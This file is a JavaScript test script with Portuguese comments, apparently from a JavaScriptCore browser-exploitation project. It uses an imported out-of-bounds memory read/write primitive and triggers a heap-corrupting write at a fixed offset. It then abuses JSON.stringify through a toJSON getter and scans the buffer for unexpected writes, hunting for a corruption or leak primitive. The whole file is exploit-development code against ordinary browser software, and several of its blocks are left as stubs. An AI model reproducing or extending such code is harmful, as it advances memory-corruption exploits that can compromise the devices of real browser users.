// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForStringifierAbuse";
let getter_called_flag = false;
let current_test_results = {
    success: false,
    message: "Teste não iniciado.",
    error: null,
    details: "",
    unexpected_writes_in_oob_ab: []
};

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const OOB_AB_FILL_PATTERN_U32 = 0xABABABAB; // Padrão para preencher o oob_ab
const OOB_AB_SNOOP_AREA_START = 0;
const OOB_AB_SNOOP_AREA_END = 0x800; // Sondar os primeiros 2KB

class CheckpointForStringifierAbuse {
    constructor(id) {
        this.id_marker = `StringifierAbuseCheckpoint-${id}`;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "StringifierAbuse_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = {
            success: false, message: "Getter chamado, testando Stringifier corrompido.",
            error: null, details: "", unexpected_writes_in_oob_ab: []
        };
        let details_log = [];
        let anomalias_detectadas_no_getter = false;

        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
                throw new Error("Dependências OOB R/W ou oob_ab não disponíveis no getter.");
            }

            // 1. Preencher uma grande parte do oob_array_buffer_real com um padrão conhecido
            logS3("DENTRO DO GETTER: Preenchendo oob_array_buffer_real com padrão...", "info", FNAME_GETTER);
            const fill_end = Math.min(OOB_AB_SNOOP_AREA_END + 0x100, oob_array_buffer_real.byteLength); // Um pouco além da área de sondagem
            for (let offset = OOB_AB_SNOOP_AREA_START; offset < fill_end; offset += 4) {
                if (offset === CORRUPTION_OFFSET_TRIGGER || offset === CORRUPTION_OFFSET_TRIGGER + 4) continue; // Não sobrescrever nosso gatilho
                try {
                    oob_write_absolute(offset, OOB_AB_FILL_PATTERN_U32, 4);
                } catch(e_fill) { /* ignorar */ }
            }
            details_log.push(`oob_array_buffer_real preenchido com ${toHex(OOB_AB_FILL_PATTERN_U32)} de ${toHex(OOB_AB_SNOOP_AREA_START)} a ${toHex(fill_end)}.`);

            // 2. Criar objeto muito complexo para desafiar o Stringifier
            let deeply_nested_object = { data: "start_deep_nest" };
            let current_nest = deeply_nested_object;
            const nest_depth = 30; // Reduzido para evitar timeout excessivo no stringify
            for (let i = 0; i < nest_depth; i++) {
                current_nest.next_level = { 
                    level_id: `L${i}`, 
                    text_payload: ("PayloadXYZ" + i).repeat(5), // Strings de tamanho moderado
                    numeric_payload: [i * 10, i * 20, i * 30, i * 40, i*50, i*60, i*70, i*80, i*90, i*100]
                };
                current_nest = current_nest.next_level;
            }
            // Adicionar referência circular intencionalmente para ver como o Stringifier (corrompido?) lida
            // current_nest.circular_ref_to_root = deeply_nested_object; // CUIDADO: Pode causar loop infinito se o detector de ciclo falhar
            details_log.push(`Objeto profundamente aninhado (${nest_depth} níveis) criado.`);

            // 3. Forçar o Stringifier (potencialmente corrompido) a trabalhar
            logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO sobre objeto profundamente aninhado...", "subtest", FNAME_GETTER);
            let internal_json_output_str = "";
            let internal_json_error_msg = "";
            try {
                internal_json_output_str = JSON.stringify(deeply_nested_object);
                logS3(`DENTRO DO GETTER: JSON.stringify interno completado. Tamanho do resultado: ${internal_json_output_str.length}`, "info", FNAME_GETTER);
                // Não logar a string inteira se for muito grande
                details_log.push(`Stringify interno produziu string de tamanho ${internal_json_output_str.length}.`);
            } catch (e_json_internal) {
                internal_json_error_msg = e_json_internal.message;
                logS3(`DENTRO DO GETTER: Erro no JSON.stringify interno: ${e_json_internal.message}`, "error", FNAME_GETTER);
                details_log.push(`Erro JSON.stringify interno: ${e_json_internal.message}`);
                // Se o erro NÃO for sobre referência circular, pode ser interessante
                if (!String(e_json_internal.message).toLowerCase().includes("circular")) {
                    anomalias_detectadas_no_getter = true;
                    current_test_results.error = `Erro incomum no stringify interno: ${e_json_internal.message}`;
                }
            }

            // 4. Sondar agressivamente o oob_array_buffer_real por alterações no padrão
            logS3("DENTRO DO GETTER: Sondando oob_array_buffer_real por alterações no padrão...", "info", FNAME_GETTER);
            let unexpected_writes = [];
            for (let offset = OOB_AB_SNOOP_AREA_START; offset < OOB_AB_SNOOP_AREA_END; offset += 4) { // Ler de 4 em 4 bytes
                if (offset === CORRUPTION_OFFSET_TRIGGER || offset === CORRUPTION_OFFSET_TRIGGER + 4) continue; // Ignorar o gatilho
                 if ((offset + 4) > oob_array_buffer_real.byteLength) break;

                try {
                    const value_read_u32 = oob_read_absolute(offset, 4);
                    if (value_read_u32 !== OOB_AB_FILL_PATTERN_U32) {
                        const overwritten_info = `ALTERAÇÃO DETECTADA em oob_data[${toHex(offset)}]: ${toHex(value_read_u32)} (Esperado: ${toHex(OOB_AB_FILL_PATTERN_U32)})`;
                        logS3(overwritten_info, "leak", FNAME_GETTER);
                        unexpected_writes.push(overwritten_info);
                        anomalias_detectadas_no_getter = true;
                    }
                } catch (e_snoop_final) {
                    details_log.push(`Erro ao sondar oob_data[${toHex(offset)}]: ${e_snoop_final.message}`);
                }
            }
            current_test_results.unexpected_writes_in_oob_ab = unexpected_writes;
            if (unexpected_writes.length > 0) {
                details_log.push(`${unexpected_writes.length} escritas inesperadas encontradas em oob_array_buffer_real.`);
                logS3(`DENTRO DO GETTER: ${unexpected_writes.length} ESCRITAS INESPERADAS ENCONTRADAS EM OOB_AB!`, "vuln", FNAME_GETTER);
            } else {
                details_log.push("Nenhuma escrita inesperada (alteração de padrão) encontrada em oob_array_buffer_real.");
                 logS3("DENTRO DO GETTER: Nenhuma alteração de padrão encontrada em oob_array_buffer_real.", "good", FNAME_GETTER);
            }

            if (anomalias_detectadas_no_getter) {
                current_test_results.success = true;
                current_test_results.message = "Anomalias (erro incomum no stringify interno ou escritas inesperadas em oob_ab) detectadas!";
            } else {
                current_test_results.message = "Nenhuma anomalia óbvia detectada ao abusar do Stringifier.";
            }
            current_test_results.details = details_log.join('; ');

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        return 0xBADF00D;
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForStringifierAbuse.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_stringifier_abuse_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST_RUNNER = "executeStringifierAbuseTestRunner";
    logS3(`--- Iniciando Teste de Abuso de Stringifier Corrompido ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* ... reset inicial ... */ };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        // Escrita OOB Gatilho (para corromper o heap/Stringifier)
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        const checkpoint_obj = new CheckpointForStringifierAbuse(1);
        logS3(`CheckpointForStringifierAbuse objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) { /* ... */ }

    } catch (mainError) { /* ... */ }
    finally { /* ... */ }

    // Log dos resultados
    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE ABUSO STRINGIFIER: SUCESSO ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO TESTE ABUSO STRINGIFIER: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da tentativa: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
        }
        if (current_test_results.unexpected_writes_in_oob_ab && current_test_results.unexpected_writes_in_oob_ab.length > 0) {
            logS3("Escritas Inesperadas no oob_array_buffer_real Detectadas:", "leak", FNAME_TEST_RUNNER);
            current_test_results.unexpected_writes_in_oob_ab.forEach(info => {
                logS3(`  ${info}`, "leak", FNAME_TEST_RUNNER);
            });
        }
         if (current_test_results.error) {
            logS3(`  Erro reportado: ${current_test_results.error}`, "error", FNAME_TEST_RUNNER);
        }
    } else {
        logS3("RESULTADO TESTE ABUSO STRINGIFIER: Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
    }

    clearOOBEnvironment();
    logS3(`--- Teste de Abuso de Stringifier Corrompido Concluído ---`, "test", FNAME_TEST_RUNNER);
}
